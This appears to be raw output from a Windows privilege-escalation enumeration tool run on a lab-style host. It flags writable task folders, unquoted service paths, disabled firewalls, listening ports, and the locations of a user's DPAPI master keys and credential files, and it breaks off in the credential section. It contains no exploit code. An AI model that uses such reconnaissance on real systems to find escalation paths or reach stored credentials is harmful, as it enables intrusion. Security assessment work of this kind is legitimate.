    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Authenticated Users [Allow: AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
    Key: StubPath
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\111.0.1661.41\Installer
    File: C:\Program Files (x86)\Microsoft\Edge\Application\111.0.1661.41\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge --channel=stable (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\111.0.1661.41\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\111.0.1661.41\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\111.0.1661.41\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\111.0.1661.41\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\Sandra\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Sandra [Allow: AllAccess]
    File: C:\Users\Sandra\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\Sandra\AppData\Roaming\Microsoft\Windows,C:\Users\Sandra\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini 
    FilePerms: Sandra [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    VMware vSockets Service - 9.8.17.0 build-16460229 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware PCI VMCI Bus Device - 9.8.16.0 build-14168184 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.20.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.710.10.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1015 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    VMware PVSCSI StorPort driver (64-bit) - 1.3.17.0 build-17958848 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\pvscsi.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.1.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    VMware Guest Introspection Driver - 11.2.5.0 build-17139333 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsepflt.sys
    VMware Raw Disk Helper Driver - 1.1.5.0 build-14169150 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmrawdsk.sys
    VMware Guest Introspection WFP Network Filter Driver - 11.2.6.0 build-17883993 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vnetWFP.sys
    VMware Pointing PS/2 Device Driver - 12.5.10.0 build-14169150 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 8.17.02.0014 - build-17592369 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 8.17.02.0014 - build-17592369 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware server memory controller - 7.5.5.0 build-14903665 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.9.2.0 build-17964782 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
È The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:8A:67:09]: 192.168.104.111 / 255.255.255.0
        Gateways: 192.168.104.254
        DNSs: 192.168.104.254
        Known hosts:
          192.168.104.112       00-50-56-8A-56-66     Dynamic
          192.168.104.206       00-50-56-8A-96-F7     Dynamic
          192.168.104.254       00-50-56-8A-C5-9B     Dynamic
          192.168.104.255       FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static


ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               21            0.0.0.0               0               Listening         2784            svchost
  TCP        0.0.0.0               80            0.0.0.0               0               Listening         2716            cbssvcX64
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         924             svchost
  TCP        0.0.0.0               443           0.0.0.0               0               Listening         2716            cbssvcX64
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         3064            svchost
  TCP        0.0.0.0               5357          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               7680          0.0.0.0               0               Listening         4524            svchost
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         2568            WebServerForAdmin
  TCP        0.0.0.0               8443          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         712             lsass
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         560             wininit
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1172            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1508            svchost
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         660             services
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         2536            svchost

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        21            [::]                                        0               Listening         2784            svchost
  TCP        [::]                                        135           [::]                                        0               Listening         924             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        5357          [::]                                        0               Listening         4               System
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        7680          [::]                                        0               Listening         4524            svchost
  TCP        [::]                                        8443          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         712             lsass
  TCP        [::]                                        49665         [::]                                        0               Listening         560             wininit
  TCP        [::]                                        49666         [::]                                        0               Listening         1172            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         1508            svchost
  TCP        [::]                                        49668         [::]                                        0               Listening         660             services
  TCP        [::]                                        49669         [::]                                        0               Listening         2536            svchost

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            6648              svchost
  UDP        0.0.0.0               500           *:*                            2520              svchost
  UDP        0.0.0.0               3702          *:*                            2384              svchost
  UDP        0.0.0.0               3702          *:*                            2384              svchost
  UDP        0.0.0.0               4500          *:*                            2520              svchost
  UDP        0.0.0.0               5050          *:*                            3064              svchost
  UDP        0.0.0.0               5353          *:*                            1924              svchost
  UDP        0.0.0.0               5355          *:*                            1924              svchost
  UDP        0.0.0.0               10000         *:*                            2716              cbssvcX64
  UDP        0.0.0.0               56568         *:*                            2384              svchost
  UDP        127.0.0.1             1900          *:*                            4316              svchost
  UDP        127.0.0.1             56570         *:*                            2940              svchost
  UDP        127.0.0.1             59498         *:*                            4316              svchost
  UDP        192.168.104.111       137           *:*                            4                 System
  UDP        192.168.104.111       138           *:*                            4                 System
  UDP        192.168.104.111       1900          *:*                            4316              svchost
  UDP        192.168.104.111       59497         *:*                            4316              svchost

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            6648              svchost
  UDP        [::]                                        500           *:*                            2520              svchost
  UDP        [::]                                        3702          *:*                            2384              svchost
  UDP        [::]                                        3702          *:*                            2384              svchost
  UDP        [::]                                        4500          *:*                            2520              svchost
  UDP        [::]                                        56569         *:*                            2384              svchost
  UDP        [::1]                                       1900          *:*                            4316              svchost
  UDP        [::1]                                       59496         *:*                            4316              svchost

ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
È Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    False
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:

ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
    Entry                                 Name                                  Data
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        CertificateRevocation                     1
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        WarnonZoneCrossing                        0
  HKCU        EnableNegotiate                           1
  HKCU        ProxyEnable                               0
  HKCU        MigrateProxy                              1
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Internet Connectivity
È Checking if internet access is possible via different methods 
    HTTP (80) Access: Not Accessible
  [X] Exception:       Error: A task was canceled.
    HTTPS (443) Access: Not Accessible
  [X] Exception:       Error: TCP connect timed out
    HTTPS (443) Access by Domain Name: Not Accessible
  [X] Exception:       Error: A task was canceled.
    DNS (53) Access: Not Accessible
  [X] Exception:       Error: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
    ICMP (ping) Access: Not Accessible
  [X] Exception:       Error: Ping failed: TimedOut

ÉÍÍÍÍÍÍÍÍÍÍ¹ Hostname Resolution
È Checking if the hostname can be resolved externally 
  [X] Exception:     Error during hostname check: A task was canceled.


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Active Directory Quick Checks ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ gMSA readable managed passwords
È Look for Group Managed Service Accounts you can read (msDS-ManagedPassword) https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gmsa.html
  [-] Host is not domain-joined. Skipping.

ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC
È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
  [-] Host is not domain-joined. Skipping.


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Cloud Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
Learn and practice cloud hacking in training.hacktricks.xyz
AWS EC2?                                No   
Azure VM?                               No   
Azure Tokens?                           No   
Google Cloud Platform?                  No   
Google Workspace Joined?                No   
Google Cloud Directory Sync?            No   
Google Password Sync?                   No   


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
  [ERROR] Unable to enumerate vaults. Error (0x1061)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
Please run: 
cmdkey /list

ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    MasterKey: C:\Users\Sandra\AppData\Roaming\Microsoft\Protect\S-1-5-21-4214290425-2411352775-3126579912-1002\011930a3-d5ce-4308-80ac-076116b46875
    Accessed: 3/29/2023 1:08:39 AM
    Modified: 3/15/2023 3:28:11 AM
   =================================================================================================

    MasterKey: C:\Users\Sandra\AppData\Roaming\Microsoft\Protect\S-1-5-21-4214290425-2411352775-3126579912-1002\2b7242a0-a260-4d3e-ab5b-de256f7db4e2
    Accessed: 3/8/2022 12:56:08 AM
    Modified: 2/21/2022 3:11:54 PM
   =================================================================================================

    MasterKey: C:\Users\Sandra\AppData\Roaming\Microsoft\Protect\S-1-5-21-4214290425-2411352775-3126579912-1002\4159884d-1f1d-4af5-bb1a-8a381aab659d
    Accessed: 2/3/2023 2:09:35 AM
    Modified: 11/8/2022 1:30:14 AM
   =================================================================================================

    MasterKey: C:\Users\Sandra\AppData\Roaming\Microsoft\Protect\S-1-5-21-4214290425-2411352775-3126579912-1002\a0762950-6008-41be-92e1-f59b92efd3b8
    Accessed: 8/14/2022 8:06:53 AM
    Modified: 7/6/2022 12:46:50 AM
   =================================================================================================

    MasterKey: C:\Users\Sandra\AppData\Roaming\Microsoft\Protect\S-1-5-21-4214290425-2411352775-3126579912-1002\b9ab6472-d6a7-4f90-81e1-d7c233889a50
    Accessed: 3/15/2023 3:28:11 AM
    Modified: 3/15/2023 3:13:20 AM
   =================================================================================================

    MasterKey: C:\Users\Sandra\AppData\Roaming\Microsoft\Protect\S-1-5-21-4214290425-2411352775-3126579912-1002\cfd6e504-3e88-4253-9653-14f0a31dbae0
    Accessed: 2/21/2026 6:16:40 PM
    Modified: 2/21/2026 6:16:40 PM
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    CredFile: C:\Users\Sandra\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

```